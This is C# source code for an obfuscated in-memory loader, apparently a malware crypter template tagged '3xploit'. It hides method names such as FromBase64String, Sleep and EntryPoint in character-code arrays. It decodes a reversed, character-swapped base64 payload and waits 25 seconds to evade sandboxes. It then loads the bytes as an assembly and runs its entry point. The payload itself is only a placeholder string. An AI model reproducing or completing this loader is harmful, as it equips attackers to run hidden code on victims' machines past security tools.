using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace load_entrypoint_dll
{
    public  class EJECUCION
    {
     //3xploit 25-08-2020
       public static void Main()
        {
            string PAYLOAD = "sring bs64 reverse add replace ";
            string reverse = ReverseString(PAYLOAD);
            string Rep = reverse.Replace("#", "A");
            
            var FRB64 = new string(new char[] { (char)70, (char)114, (char)111, (char)109, (char)66, (char)97, (char)115, (char)101, (char)54, (char)52, (char)83, (char)116, (char)114, (char)105, (char)110, (char)103 });
            var SLEEP = new string(new char[] { (char)83, (char)108, (char)101, (char)101, (char)112 });
            byte[] x3 = (byte[])typeof(System.Convert).GetMethod(FRB64).Invoke(null, new object[] { Rep });

            Type[] TIEMPO = { typeof(int) };
            typeof(System.Threading.Thread).GetMethod(SLEEP, TIEMPO).Invoke(null, new object[] { 25000 });

            var X1 = System.Reflection.Assembly.Load(x3);
            var ENT = new string(new char[] { (char)69, (char)110, (char)116, (char)114, (char)121, (char)80, (char)111, (char)105, (char)110, (char)116 });
            var INV = new string(new char[] { (char)105, (char)110, (char)118, (char)111, (char)107, (char)101 });
            var X2 = (System.Reflection.MethodInfo)Microsoft.VisualBasic.CompilerServices.LateBinding.LateGet(X1, null, ENT, null, null, null);
            Microsoft.VisualBasic.CompilerServices.LateBinding.LateCall(X2, null, INV, new object[] { null, null }, null, null);

        }
        public static string ReverseString(string s)
        {
            char[] arr = s.ToCharArray();
            Array.Reverse(arr);
            return new string(arr);

        }
    }
    }
